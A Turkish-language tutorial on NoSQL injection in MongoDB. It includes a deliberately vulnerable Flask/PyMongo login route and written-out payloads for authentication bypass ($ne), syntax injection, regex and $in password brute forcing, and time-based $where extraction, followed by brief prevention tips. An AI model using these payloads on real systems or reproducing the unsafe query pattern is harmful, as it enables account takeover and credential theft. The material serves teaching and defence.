# NoSQL Injection
NoSQL Injection, web uygulamalarında kullanılan MongoDB gibi NoSQL tabanlı veritabanlarının kullanıcı girdisini doğru şekilde filtrelemeden sorgulara dahil etmesi sonucu ortaya çıkan kritik bir güvenlik açığıdır. SQL Injection ile benzer mantığa sahiptir, ancak klasik SQL yerine JSON benzeri query yapıları manipüle edilir. Bu zafiyet sayesinde saldırgan authentication bypass, yetkisiz veri erişimi, veri manipülasyonu ve bazı durumlarda remote code execution gerçekleştirebilir.

NoSQL Injection genellikle şu koşullarda görülür:
- Kullanıcı girdisinin doğrudan MongoDB query objesine eklenmesi
- Query operatörlerinin ($ne, $gt, $regex, $where) filtrelenmemesi

Sonuç: Saldırgan login atlatma, hassas verileri çekme, yetki yükseltme gibi saldırılar gerçekleştirebilir.

# NoSQL Injection Saldırısının İşleyişi
Aşağıda, NoSQL Injection zafiyetine sahip basit bir Flask + PyMongo uygulaması örneği bulunmaktadır:
```py
from flask import Flask, request
from pymongo import MongoClient

app = Flask(__name__)
client = MongoClient("mongodb://localhost:27017/")
db = client["usersdb"]
users = db["users"]

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Kullanıcı girdisi direkt olarak Mongo query'e aktarılıyor
    user = users.find_one({"username": username, "password": password})
    
    if user:
        return "Login başarılı! Hoşgeldin " + user['username']
    else:
        return "Login başarısız!"
    
if __name__ == "__main__":
    app.run(debug=True)
```

Geliştirici, normalde girişin şu şekilde çalışacağını varsayar:
```http
POST /login
username=baran&password=123456
```

Ancak saldırgan aşağıdaki payload ile authentication atlatabilir:
```http
POST /login
username[$ne]=foo&password[$ne]=bar
```

MongoDB query şu hale gelir:
```
{ "username": { "$ne": "foo" }, "password": { "$ne": "bar" } }
```

Bu sorgu, “username foo değil ve password bar değil” koşulunu sağlayan herhangi bir kullanıcıyı döndürecektir.

# NoSQL Syntax Injection
Syntax Injection, uygulamanın beklediği basit string değer yerine doğrudan query syntax’ını manipüle edecek input verilmesidir.
Klasik örnek:
```
POST /login
username=baran' || '1'=='1&password=foo
```

Eğer backend tarafında kullanıcı girdisi string escape edilmeden sorguya ekleniyorsa, NoSQL query objesi şu hale gelebilir:
```
{ "username": "baran' || '1'=='1", "password": "foo" }
```

# NoSQL Operator Injection
Operator Injection, NoSQL’in desteklediği özel operatörleri ($ne, $gt, $in, $regex, $where) parametre içine enjekte ederek sorguyu değiştirmektir.
Örnek payload:
```
POST /login
username[$ne]=foo&password[$ne]=bar
```

Sorgu şu hale gelir:
```
{ "username": { "$ne": "foo" }, "password": { "$ne": "bar" } }
```

## Exploiting Syntax Injection to Extract Data
Syntax Injection, genellikle hata mesajları veya response farkları üzerinden data extraction için kullanılabilir.

Örnek senaryo:
```
username=admin' && this.password[0]=='a' || '1'=='1&password=foo
```

Eğer backend eval() veya where benzeri bir query parse ediyorsa, saldırgan password alanının karakterlerini boolean tabanlı testlerle brute-force edebilir.

## Exploiting NoSQL Operator Injection to Extract Data
Operator Injection, özellikle $regex ve $where kullanılarak data extraction için güçlüdür.

### Regex tabanlı brute force
```
username=admin&password[$regex]=^a.*
```

Eğer şifre “a” ile başlıyorsa login başarılı.

Sonraki adım:
```
username=admin&password[$regex]=^ab.*
```

Yanıt farklılığı şifre karakterlerini ortaya çıkarır.

### $in Operatörü
```
username=admin&password[$in]=["123456","password","qwerty"]
```

Şifre hangi listedeyse login başarılı olur. Wordlist ile brute force hızlanır.

### $where tabanlı zaman ölçümü
```
username=admin&password[$where]=function(){ if(this.password.charAt(0)=='a'){ sleep(5000); } return true; }
```

Yanıt gecikmesi üzerinden password ilk karakteri çıkarılabilir.

# NoSQL Injection Zafiyetini Önlemek
## Parametrik Query Kullanımı
- Kullanıcı girdisini doğrudan sorguya koyma. Mümkünse ORM/ODM (Mongoose, SQLAlchemy benzeri) kullan.

## $where ve JavaScript Execution Devre Dışı Bırakma
- MongoDB’de --noscripting parametresi kullanılmalı.

## ORM/ODM Doğrulama Mekanizmaları
- Mongoose gibi ODM’lerde schema validation zorunlu kıl.